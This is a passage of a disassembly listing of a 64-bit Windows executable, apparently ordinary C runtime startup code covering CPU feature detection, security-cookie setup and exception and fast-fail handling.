   140008ded:	c7 05 c1 70 01 00 01 	movl   $0x1,0x170c1(%rip)        # 0x14001feb8
   140008df4:	00 00 00 
   140008df7:	b8 08 00 00 00       	mov    $0x8,%eax
   140008dfc:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140008e00:	48 8d 0d b9 70 01 00 	lea    0x170b9(%rip),%rcx        # 0x14001fec0
   140008e07:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140008e0e:	00 
   140008e0f:	b8 08 00 00 00       	mov    $0x8,%eax
   140008e14:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140008e18:	48 8b 0d 21 92 00 00 	mov    0x9221(%rip),%rcx        # 0x140012040
   140008e1f:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140008e24:	b8 08 00 00 00       	mov    $0x8,%eax
   140008e29:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140008e2d:	48 8b 0d 4c 92 00 00 	mov    0x924c(%rip),%rcx        # 0x140012080
   140008e34:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140008e39:	48 8d 0d 00 27 00 00 	lea    0x2700(%rip),%rcx        # 0x14000b540
   140008e40:	e8 ff fe ff ff       	call   0x140008d44
   140008e45:	90                   	nop
   140008e46:	48 83 c4 38          	add    $0x38,%rsp
   140008e4a:	c3                   	ret
   140008e4b:	cc                   	int3
   140008e4c:	40 53                	rex push %rbx
   140008e4e:	56                   	push   %rsi
   140008e4f:	57                   	push   %rdi
   140008e50:	48 83 ec 40          	sub    $0x40,%rsp
   140008e54:	48 8b d9             	mov    %rcx,%rbx
   140008e57:	ff 15 5b 22 00 00    	call   *0x225b(%rip)        # 0x14000b0b8
   140008e5d:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140008e64:	33 ff                	xor    %edi,%edi
   140008e66:	45 33 c0             	xor    %r8d,%r8d
   140008e69:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140008e6e:	48 8b ce             	mov    %rsi,%rcx
   140008e71:	ff 15 d1 21 00 00    	call   *0x21d1(%rip)        # 0x14000b048
   140008e77:	48 85 c0             	test   %rax,%rax
   140008e7a:	74 3c                	je     0x140008eb8
   140008e7c:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140008e81:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140008e86:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140008e8d:	00 00 
   140008e8f:	4c 8b c8             	mov    %rax,%r9
   140008e92:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140008e97:	4c 8b c6             	mov    %rsi,%r8
   140008e9a:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140008e9f:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140008ea4:	33 c9                	xor    %ecx,%ecx
   140008ea6:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008eab:	ff 15 9f 21 00 00    	call   *0x219f(%rip)        # 0x14000b050
   140008eb1:	ff c7                	inc    %edi
   140008eb3:	83 ff 02             	cmp    $0x2,%edi
   140008eb6:	7c ae                	jl     0x140008e66
   140008eb8:	48 83 c4 40          	add    $0x40,%rsp
   140008ebc:	5f                   	pop    %rdi
   140008ebd:	5e                   	pop    %rsi
   140008ebe:	5b                   	pop    %rbx
   140008ebf:	c3                   	ret
   140008ec0:	48 8d 05 b9 26 00 00 	lea    0x26b9(%rip),%rax        # 0x14000b580
   140008ec7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140008ece:	00 
   140008ecf:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140008ed3:	48 8d 05 96 26 00 00 	lea    0x2696(%rip),%rax        # 0x14000b570
   140008eda:	48 89 01             	mov    %rax,(%rcx)
   140008edd:	48 8b c1             	mov    %rcx,%rax
   140008ee0:	c3                   	ret
   140008ee1:	cc                   	int3
   140008ee2:	cc                   	int3
   140008ee3:	cc                   	int3
   140008ee4:	48 83 ec 48          	sub    $0x48,%rsp
   140008ee8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008eed:	e8 ce ff ff ff       	call   0x140008ec0
   140008ef2:	48 8d 15 77 70 00 00 	lea    0x7077(%rip),%rdx        # 0x14000ff70
   140008ef9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140008efe:	e8 70 08 00 00       	call   0x140009773
   140008f03:	cc                   	int3
   140008f04:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140008f09:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140008f0e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008f13:	57                   	push   %rdi
   140008f14:	48 83 ec 10          	sub    $0x10,%rsp
   140008f18:	33 c0                	xor    %eax,%eax
   140008f1a:	33 c9                	xor    %ecx,%ecx
   140008f1c:	0f a2                	cpuid
   140008f1e:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   140008f24:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140008f2a:	0b d1                	or     %ecx,%edx
   140008f2c:	8b e8                	mov    %eax,%ebp
   140008f2e:	b8 01 00 00 00       	mov    $0x1,%eax
   140008f33:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140008f39:	0b d3                	or     %ebx,%edx
   140008f3b:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140008f3e:	0f a2                	cpuid
   140008f40:	8b f9                	mov    %ecx,%edi
   140008f42:	75 5e                	jne    0x140008fa2
   140008f44:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140008f49:	48 c7 05 44 91 00 00 	movq   $0x8000,0x9144(%rip)        # 0x140012098
   140008f50:	00 80 00 00 
   140008f54:	48 c7 05 41 91 00 00 	movq   $0xffffffffffffffff,0x9141(%rip)        # 0x1400120a0
   140008f5b:	ff ff ff ff 
   140008f5f:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140008f64:	74 28                	je     0x140008f8e
   140008f66:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140008f6b:	74 21                	je     0x140008f8e
   140008f6d:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140008f72:	74 1a                	je     0x140008f8e
   140008f74:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140008f79:	83 f8 20             	cmp    $0x20,%eax
   140008f7c:	77 24                	ja     0x140008fa2
   140008f7e:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140008f85:	00 00 00 
   140008f88:	48 0f a3 c1          	bt     %rax,%rcx
   140008f8c:	73 14                	jae    0x140008fa2
   140008f8e:	44 8b 05 7f 74 01 00 	mov    0x1747f(%rip),%r8d        # 0x140020414
   140008f95:	41 83 c8 01          	or     $0x1,%r8d
   140008f99:	44 89 05 74 74 01 00 	mov    %r8d,0x17474(%rip)        # 0x140020414
   140008fa0:	eb 07                	jmp    0x140008fa9
   140008fa2:	44 8b 05 6b 74 01 00 	mov    0x1746b(%rip),%r8d        # 0x140020414
   140008fa9:	45 33 c9             	xor    %r9d,%r9d
   140008fac:	41 8b f1             	mov    %r9d,%esi
   140008faf:	45 8b d1             	mov    %r9d,%r10d
   140008fb2:	45 8b d9             	mov    %r9d,%r11d
   140008fb5:	83 fd 07             	cmp    $0x7,%ebp
   140008fb8:	7c 40                	jl     0x140008ffa
   140008fba:	41 8d 41 07          	lea    0x7(%r9),%eax
   140008fbe:	33 c9                	xor    %ecx,%ecx
   140008fc0:	0f a2                	cpuid
   140008fc2:	8b f2                	mov    %edx,%esi
   140008fc4:	44 8b cb             	mov    %ebx,%r9d
   140008fc7:	0f ba e3 09          	bt     $0x9,%ebx
   140008fcb:	73 0b                	jae    0x140008fd8
   140008fcd:	41 83 c8 02          	or     $0x2,%r8d
   140008fd1:	44 89 05 3c 74 01 00 	mov    %r8d,0x1743c(%rip)        # 0x140020414
   140008fd8:	83 f8 01             	cmp    $0x1,%eax
   140008fdb:	7c 0d                	jl     0x140008fea
   140008fdd:	b8 07 00 00 00       	mov    $0x7,%eax
   140008fe2:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140008fe5:	0f a2                	cpuid
   140008fe7:	44 8b d2             	mov    %edx,%r10d
   140008fea:	b8 24 00 00 00       	mov    $0x24,%eax
   140008fef:	3b e8                	cmp    %eax,%ebp
   140008ff1:	7c 07                	jl     0x140008ffa
   140008ff3:	33 c9                	xor    %ecx,%ecx
   140008ff5:	0f a2                	cpuid
   140008ff7:	44 8b db             	mov    %ebx,%r11d
   140008ffa:	48 8b 05 87 90 00 00 	mov    0x9087(%rip),%rax        # 0x140012088
   140009001:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140009005:	c7 05 81 90 00 00 01 	movl   $0x1,0x9081(%rip)        # 0x140012090
   14000900c:	00 00 00 
   14000900f:	c7 05 7b 90 00 00 02 	movl   $0x2,0x907b(%rip)        # 0x140012094
   140009016:	00 00 00 
   140009019:	48 89 05 68 90 00 00 	mov    %rax,0x9068(%rip)        # 0x140012088
   140009020:	0f ba e7 14          	bt     $0x14,%edi
   140009024:	73 1f                	jae    0x140009045
   140009026:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   14000902a:	c7 05 5c 90 00 00 02 	movl   $0x2,0x905c(%rip)        # 0x140012090
   140009031:	00 00 00 
   140009034:	48 89 05 4d 90 00 00 	mov    %rax,0x904d(%rip)        # 0x140012088
   14000903b:	c7 05 4f 90 00 00 06 	movl   $0x6,0x904f(%rip)        # 0x140012094
   140009042:	00 00 00 
   140009045:	0f ba e7 1b          	bt     $0x1b,%edi
   140009049:	0f 83 33 01 00 00    	jae    0x140009182
   14000904f:	33 c9                	xor    %ecx,%ecx
   140009051:	0f 01 d0             	xgetbv
   140009054:	48 c1 e2 20          	shl    $0x20,%rdx
   140009058:	48 0b d0             	or     %rax,%rdx
   14000905b:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140009060:	0f ba e7 1c          	bt     $0x1c,%edi
   140009064:	0f 83 fc 00 00 00    	jae    0x140009166
   14000906a:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000906f:	24 06                	and    $0x6,%al
   140009071:	3c 06                	cmp    $0x6,%al
   140009073:	0f 85 ed 00 00 00    	jne    0x140009166
   140009079:	8b 05 15 90 00 00    	mov    0x9015(%rip),%eax        # 0x140012094
   14000907f:	b2 e0                	mov    $0xe0,%dl
   140009081:	83 c8 08             	or     $0x8,%eax
   140009084:	c7 05 02 90 00 00 03 	movl   $0x3,0x9002(%rip)        # 0x140012090
   14000908b:	00 00 00 
   14000908e:	89 05 00 90 00 00    	mov    %eax,0x9000(%rip)        # 0x140012094
   140009094:	41 f6 c1 20          	test   $0x20,%r9b
   140009098:	74 62                	je     0x1400090fc
   14000909a:	83 c8 20             	or     $0x20,%eax
   14000909d:	c7 05 e9 8f 00 00 05 	movl   $0x5,0x8fe9(%rip)        # 0x140012090
   1400090a4:	00 00 00 
   1400090a7:	89 05 e7 8f 00 00    	mov    %eax,0x8fe7(%rip)        # 0x140012094
   1400090ad:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   1400090b2:	48 8b 05 cf 8f 00 00 	mov    0x8fcf(%rip),%rax        # 0x140012088
   1400090b9:	44 23 c9             	and    %ecx,%r9d
   1400090bc:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   1400090c0:	48 89 05 c1 8f 00 00 	mov    %rax,0x8fc1(%rip)        # 0x140012088
   1400090c7:	44 3b c9             	cmp    %ecx,%r9d
   1400090ca:	75 37                	jne    0x140009103
   1400090cc:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400090d1:	22 c2                	and    %dl,%al
   1400090d3:	3a c2                	cmp    %dl,%al
   1400090d5:	75 25                	jne    0x1400090fc
   1400090d7:	48 8b 05 aa 8f 00 00 	mov    0x8faa(%rip),%rax        # 0x140012088
   1400090de:	83 0d af 8f 00 00 40 	orl    $0x40,0x8faf(%rip)        # 0x140012094
   1400090e5:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   1400090e9:	c7 05 9d 8f 00 00 06 	movl   $0x6,0x8f9d(%rip)        # 0x140012090
   1400090f0:	00 00 00 
   1400090f3:	48 89 05 8e 8f 00 00 	mov    %rax,0x8f8e(%rip)        # 0x140012088
   1400090fa:	eb 07                	jmp    0x140009103
   1400090fc:	48 8b 05 85 8f 00 00 	mov    0x8f85(%rip),%rax        # 0x140012088
   140009103:	0f ba e6 17          	bt     $0x17,%esi
   140009107:	73 0c                	jae    0x140009115
   140009109:	48 0f ba f0 18       	btr    $0x18,%rax
   14000910e:	48 89 05 73 8f 00 00 	mov    %rax,0x8f73(%rip)        # 0x140012088
   140009115:	41 0f ba e2 13       	bt     $0x13,%r10d
   14000911a:	73 4a                	jae    0x140009166
   14000911c:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140009121:	22 c2                	and    %dl,%al
   140009123:	3a c2                	cmp    %dl,%al
   140009125:	75 3f                	jne    0x140009166
   140009127:	41 8b cb             	mov    %r11d,%ecx
   14000912a:	41 8b c3             	mov    %r11d,%eax
   14000912d:	48 c1 e9 10          	shr    $0x10,%rcx
   140009131:	25 ff 00 04 00       	and    $0x400ff,%eax
   140009136:	83 e1 06             	and    $0x6,%ecx
   140009139:	89 05 d1 72 01 00    	mov    %eax,0x172d1(%rip)        # 0x140020410
   14000913f:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140009146:	48 f7 d1             	not    %rcx
   140009149:	48 23 0d 38 8f 00 00 	and    0x8f38(%rip),%rcx        # 0x140012088
   140009150:	48 89 0d 31 8f 00 00 	mov    %rcx,0x8f31(%rip)        # 0x140012088
   140009157:	3c 01                	cmp    $0x1,%al
   140009159:	76 0b                	jbe    0x140009166
   14000915b:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   14000915f:	48 89 0d 22 8f 00 00 	mov    %rcx,0x8f22(%rip)        # 0x140012088
   140009166:	41 0f ba e2 15       	bt     $0x15,%r10d
   14000916b:	73 15                	jae    0x140009182
   14000916d:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140009172:	48 0f ba e0 13       	bt     $0x13,%rax
   140009177:	73 09                	jae    0x140009182
   140009179:	48 0f ba 35 06 8f 00 	btrq   $0x7,0x8f06(%rip)        # 0x140012088
   140009180:	00 07 
   140009182:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140009187:	33 c0                	xor    %eax,%eax
   140009189:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   14000918e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009193:	48 83 c4 10          	add    $0x10,%rsp
   140009197:	5f                   	pop    %rdi
   140009198:	c3                   	ret
   140009199:	cc                   	int3
   14000919a:	cc                   	int3
   14000919b:	cc                   	int3
   14000919c:	b8 01 00 00 00       	mov    $0x1,%eax
   1400091a1:	c3                   	ret
   1400091a2:	cc                   	int3
   1400091a3:	cc                   	int3
   1400091a4:	33 c0                	xor    %eax,%eax
   1400091a6:	39 05 08 8f 00 00    	cmp    %eax,0x8f08(%rip)        # 0x1400120b4
   1400091ac:	0f 95 c0             	setne  %al
   1400091af:	c3                   	ret
   1400091b0:	c7 05 5e 72 01 00 00 	movl   $0x0,0x1725e(%rip)        # 0x140020418
   1400091b7:	00 00 00 
   1400091ba:	c3                   	ret
   1400091bb:	cc                   	int3
   1400091bc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400091c1:	55                   	push   %rbp
   1400091c2:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   1400091c9:	ff 
   1400091ca:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   1400091d1:	8b d9                	mov    %ecx,%ebx
   1400091d3:	b9 17 00 00 00       	mov    $0x17,%ecx
   1400091d8:	ff 15 9a 1e 00 00    	call   *0x1e9a(%rip)        # 0x14000b078
   1400091de:	85 c0                	test   %eax,%eax
   1400091e0:	74 04                	je     0x1400091e6
   1400091e2:	8b cb                	mov    %ebx,%ecx
   1400091e4:	cd 29                	int    $0x29
   1400091e6:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400091eb:	e8 c0 ff ff ff       	call   0x1400091b0
   1400091f0:	33 d2                	xor    %edx,%edx
   1400091f2:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400091f6:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400091fc:	e8 84 05 00 00       	call   0x140009785
   140009201:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140009205:	ff 15 ad 1e 00 00    	call   *0x1ead(%rip)        # 0x14000b0b8
   14000920b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140009212:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140009219:	48 8b cb             	mov    %rbx,%rcx
   14000921c:	45 33 c0             	xor    %r8d,%r8d
   14000921f:	ff 15 23 1e 00 00    	call   *0x1e23(%rip)        # 0x14000b048
   140009225:	48 85 c0             	test   %rax,%rax
   140009228:	74 3f                	je     0x140009269
   14000922a:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140009231:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140009238:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000923f:	00 00 
   140009241:	4c 8b c8             	mov    %rax,%r9
   140009244:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140009249:	4c 8b c3             	mov    %rbx,%r8
   14000924c:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140009253:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140009258:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000925c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009261:	33 c9                	xor    %ecx,%ecx
   140009263:	ff 15 e7 1d 00 00    	call   *0x1de7(%rip)        # 0x14000b050
   140009269:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140009270:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140009275:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   14000927c:	33 d2                	xor    %edx,%edx
   14000927e:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140009285:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   14000928b:	48 83 c0 08          	add    $0x8,%rax
   14000928f:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140009296:	e8 ea 04 00 00       	call   0x140009785
   14000929b:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400092a2:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400092a7:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1400092ae:	40 
   1400092af:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1400092b6:	00 
   1400092b7:	ff 15 c3 1d 00 00    	call   *0x1dc3(%rip)        # 0x14000b080
   1400092bd:	8b d8                	mov    %eax,%ebx
   1400092bf:	33 c9                	xor    %ecx,%ecx
   1400092c1:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400092c6:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400092cb:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400092cf:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400092d4:	ff 15 86 1d 00 00    	call   *0x1d86(%rip)        # 0x14000b060
   1400092da:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400092df:	ff 15 73 1d 00 00    	call   *0x1d73(%rip)        # 0x14000b058
   1400092e5:	85 c0                	test   %eax,%eax
   1400092e7:	75 0d                	jne    0x1400092f6
   1400092e9:	83 fb 01             	cmp    $0x1,%ebx
   1400092ec:	74 08                	je     0x1400092f6
   1400092ee:	8d 48 03             	lea    0x3(%rax),%ecx
   1400092f1:	e8 ba fe ff ff       	call   0x1400091b0
   1400092f6:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   1400092fd:	00 
   1400092fe:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140009305:	5d                   	pop    %rbp
   140009306:	c3                   	ret
   140009307:	cc                   	int3
   140009308:	e9 03 00 00 00       	jmp    0x140009310
   14000930d:	cc                   	int3
   14000930e:	cc                   	int3
   14000930f:	cc                   	int3
   140009310:	33 c0                	xor    %eax,%eax
   140009312:	c3                   	ret
   140009313:	cc                   	int3
   140009314:	48 83 ec 28          	sub    $0x28,%rsp
   140009318:	33 c9                	xor    %ecx,%ecx
   14000931a:	ff 15 68 1d 00 00    	call   *0x1d68(%rip)        # 0x14000b088
   140009320:	48 85 c0             	test   %rax,%rax
   140009323:	74 3a                	je     0x14000935f
   140009325:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   14000932a:	66 39 08             	cmp    %cx,(%rax)
   14000932d:	75 30                	jne    0x14000935f
   14000932f:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140009333:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   14000933a:	75 23                	jne    0x14000935f
   14000933c:	ba 0b 02 00 00       	mov    $0x20b,%edx
   140009341:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   140009346:	75 17                	jne    0x14000935f
   140009348:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   14000934f:	0e 
   140009350:	76 0d                	jbe    0x14000935f
   140009352:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   140009359:	00 
   14000935a:	0f 95 c0             	setne  %al
   14000935d:	eb 02                	jmp    0x140009361
   14000935f:	32 c0                	xor    %al,%al
   140009361:	48 83 c4 28          	add    $0x28,%rsp
   140009365:	c3                   	ret
   140009366:	cc                   	int3
   140009367:	cc                   	int3
   140009368:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140009378
   14000936f:	48 ff 25 ea 1c 00 00 	rex.W jmp *0x1cea(%rip)        # 0x14000b060
   140009376:	cc                   	int3
   140009377:	cc                   	int3
   140009378:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000937d:	57                   	push   %rdi
   14000937e:	48 83 ec 20          	sub    $0x20,%rsp
   140009382:	48 8b 19             	mov    (%rcx),%rbx
   140009385:	48 8b f9             	mov    %rcx,%rdi
   140009388:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000938e:	75 24                	jne    0x1400093b4
   140009390:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140009394:	75 1e                	jne    0x1400093b4
   140009396:	8b 53 20             	mov    0x20(%rbx),%edx
   140009399:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   14000939f:	74 20                	je     0x1400093c1
   1400093a1:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   1400093a7:	83 f8 01             	cmp    $0x1,%eax
   1400093aa:	76 15                	jbe    0x1400093c1
   1400093ac:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   1400093b2:	74 0d                	je     0x1400093c1
   1400093b4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400093b9:	33 c0                	xor    %eax,%eax
   1400093bb:	48 83 c4 20          	add    $0x20,%rsp
   1400093bf:	5f                   	pop    %rdi
   1400093c0:	c3                   	ret
   1400093c1:	e8 b3 03 00 00       	call   0x140009779
   1400093c6:	48 89 18             	mov    %rbx,(%rax)
   1400093c9:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   1400093cd:	e8 ad 03 00 00       	call   0x14000977f
   1400093d2:	48 89 18             	mov    %rbx,(%rax)
   1400093d5:	e8 47 04 00 00       	call   0x140009821
   1400093da:	cc                   	int3
   1400093db:	cc                   	int3
   1400093dc:	c2 00 00             	ret    $0x0
   1400093df:	cc                   	int3
   1400093e0:	e9 42 04 00 00       	jmp    0x140009827
   1400093e5:	cc                   	int3
   1400093e6:	cc                   	int3
   1400093e7:	cc                   	int3
   1400093e8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400093ed:	55                   	push   %rbp
   1400093ee:	48 8b ec             	mov    %rsp,%rbp
   1400093f1:	48 83 ec 30          	sub    $0x30,%rsp
   1400093f5:	48 8b 05 44 8c 00 00 	mov    0x8c44(%rip),%rax        # 0x140012040
   1400093fc:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140009403:	2b 00 00 
   140009406:	48 3b c3             	cmp    %rbx,%rax
   140009409:	75 77                	jne    0x140009482
   14000940b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000940f:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140009416:	00 
   140009417:	ff 15 8b 1c 00 00    	call   *0x1c8b(%rip)        # 0x14000b0a8
   14000941d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009421:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009425:	ff 15 75 1c 00 00    	call   *0x1c75(%rip)        # 0x14000b0a0
   14000942b:	8b c0                	mov    %eax,%eax
   14000942d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140009431:	ff 15 61 1c 00 00    	call   *0x1c61(%rip)        # 0x14000b098
   140009437:	8b c0                	mov    %eax,%eax
   140009439:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000943d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140009441:	ff 15 49 1c 00 00    	call   *0x1c49(%rip)        # 0x14000b090
   140009447:	8b 45 18             	mov    0x18(%rbp),%eax
   14000944a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000944e:	48 c1 e0 20          	shl    $0x20,%rax
   140009452:	48 33 45 18          	xor    0x18(%rbp),%rax
   140009456:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000945a:	48 33 c1             	xor    %rcx,%rax
   14000945d:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140009464:	ff 00 00 
   140009467:	48 23 c1             	and    %rcx,%rax
   14000946a:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140009471:	2b 00 00 
   140009474:	48 3b c3             	cmp    %rbx,%rax
   140009477:	48 0f 44 c1          	cmove  %rcx,%rax
   14000947b:	48 89 05 be 8b 00 00 	mov    %rax,0x8bbe(%rip)        # 0x140012040
   140009482:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009487:	48 f7 d0             	not    %rax
   14000948a:	48 89 05 ef 8b 00 00 	mov    %rax,0x8bef(%rip)        # 0x140012080
   140009491:	48 83 c4 30          	add    $0x30,%rsp
   140009495:	5d                   	pop    %rbp
   140009496:	c3                   	ret
   140009497:	cc                   	int3
   140009498:	b8 00 40 00 00       	mov    $0x4000,%eax
   14000949d:	c3                   	ret
   14000949e:	cc                   	int3
   14000949f:	cc                   	int3
   1400094a0:	48 8d 0d 79 6f 01 00 	lea    0x16f79(%rip),%rcx        # 0x140020420
   1400094a7:	48 ff 25 02 1c 00 00 	rex.W jmp *0x1c02(%rip)        # 0x14000b0b0
   1400094ae:	cc                   	int3
   1400094af:	cc                   	int3
   1400094b0:	b0 01                	mov    $0x1,%al
   1400094b2:	c3                   	ret
   1400094b3:	cc                   	int3
   1400094b4:	48 8d 05 75 6f 01 00 	lea    0x16f75(%rip),%rax        # 0x140020430
   1400094bb:	c3                   	ret
   1400094bc:	48 8d 05 75 6f 01 00 	lea    0x16f75(%rip),%rax        # 0x140020438
   1400094c3:	c3                   	ret
   1400094c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400094c8:	e8 e7 ff ff ff       	call   0x1400094b4
   1400094cd:	48 83 08 24          	orq    $0x24,(%rax)
   1400094d1:	e8 e6 ff ff ff       	call   0x1400094bc
   1400094d6:	48 83 08 02          	orq    $0x2,(%rax)
   1400094da:	48 83 c4 28          	add    $0x28,%rsp
   1400094de:	c3                   	ret
   1400094df:	cc                   	int3
   1400094e0:	33 c0                	xor    %eax,%eax
   1400094e2:	39 05 c0 8b 00 00    	cmp    %eax,0x8bc0(%rip)        # 0x1400120a8
   1400094e8:	0f 94 c0             	sete   %al
   1400094eb:	c3                   	ret
   1400094ec:	48 8d 05 15 71 01 00 	lea    0x17115(%rip),%rax        # 0x140020608
   1400094f3:	c3                   	ret
   1400094f4:	48 8d 05 05 71 01 00 	lea    0x17105(%rip),%rax        # 0x140020600
   1400094fb:	c3                   	ret
   1400094fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009501:	57                   	push   %rdi
   140009502:	48 83 ec 20          	sub    $0x20,%rsp
   140009506:	48 8d 1d 1b 62 00 00 	lea    0x621b(%rip),%rbx        # 0x14000f728
   14000950d:	48 8d 3d 14 62 00 00 	lea    0x6214(%rip),%rdi        # 0x14000f728
   140009514:	eb 12                	jmp    0x140009528
   140009516:	48 8b 03             	mov    (%rbx),%rax
   140009519:	48 85 c0             	test   %rax,%rax
   14000951c:	74 06                	je     0x140009524
   14000951e:	ff 15 ec 1e 00 00    	call   *0x1eec(%rip)        # 0x14000b410
   140009524:	48 83 c3 08          	add    $0x8,%rbx
   140009528:	48 3b df             	cmp    %rdi,%rbx
   14000952b:	72 e9                	jb     0x140009516
   14000952d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009532:	48 83 c4 20          	add    $0x20,%rsp
   140009536:	5f                   	pop    %rdi
   140009537:	c3                   	ret
   140009538:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000953d:	57                   	push   %rdi
